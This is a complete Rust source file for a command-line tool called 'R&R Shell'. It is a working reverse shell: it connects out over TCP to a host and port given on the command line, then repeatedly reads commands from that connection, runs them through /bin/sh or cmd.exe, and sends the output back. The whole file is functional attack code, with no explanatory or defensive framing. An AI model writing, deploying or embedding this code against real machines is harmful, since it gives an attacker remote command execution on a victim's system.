extern crate clap;
use clap::{App, Arg};

use std::io::{Read, Write};
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use std::{env, net::TcpStream};

fn main() {
    let matches = App::new("R&R Shell")
        .version("1.0")
        .arg(
            Arg::with_name("ip")
                .short("i")
                .help("IP address of host to connect back to.")
                .required(true)
                .takes_value(true),
        )
        .arg(
            Arg::with_name("port")
                .short("p")
                .help("Port on host to connect to.")
                .required(true)
                .takes_value(true),
        )
        .get_matches();

    let port = matches.value_of("port").unwrap();
    let host = matches.value_of("ip").unwrap();

    println!("[*] Creating connection to {host}:{port}");
    let stream = TcpStream::connect(format!("{}:{}", host, port));

    match stream {
        Ok(mut succ) => {
            println!("[*] Connection successful.");
            command_exec_listener(&mut succ);
        }
        Err(e) => {
            println!("[*] Failed to create connection with error {e}");
        }
    }
}

fn get_os_fam() -> Vec<String> {
    match env::consts::FAMILY {
        "unix" => vec!["/bin/sh".to_string(), "-c".to_string()],
        "windows" => vec!["cmd.exe".to_string(), "/C".to_string()],
        _ => panic!("random argument in OS match"),
    }
}

fn command_exec_listener(stream: &mut TcpStream) -> ! {
    let cmd = get_os_fam();

    loop {
        let mut buf: [u8; 512] = [0; 512];
        let size = stream.read(&mut buf);

        match size {
            Err(e) => match write!(stream, "Failure to read from stream with error {e}") {
                Ok(_) => println!("Successfully wrote to stream"),
                Err(e) => println!("Failed to write to stream with error {e}"),
            },
            Ok(_) => {
                let rec_com = String::from_utf8(buf.to_vec()).expect("fount invalid data");
                let rec_com = rec_com.trim_matches(char::from(0));
                println!("Read {}", rec_com);

                let resp = Command::new(&cmd[0])
                    .arg(&cmd[1])
                    .arg(&rec_com)
                    .output()
                    .expect("failed to exec command");
                println!("result: {resp:?}");

                let mut response_str =
                    String::from_utf8(resp.stdout).expect("Invalid data in string.");
                if response_str.len() == 0 && resp.stderr.len() > 0 {
                    response_str = String::from_utf8(resp.stderr).expect("Invalid data in string.");
                }

                match write!(stream, "{}\n", response_str) {
                    Ok(_) => println!("Successfully returned result for command"),
                    Err(e) => println!("Failed to return result for command with error {e}"),
                }
            }
        }
        sleep(Duration::new(5, 0));
    }
}
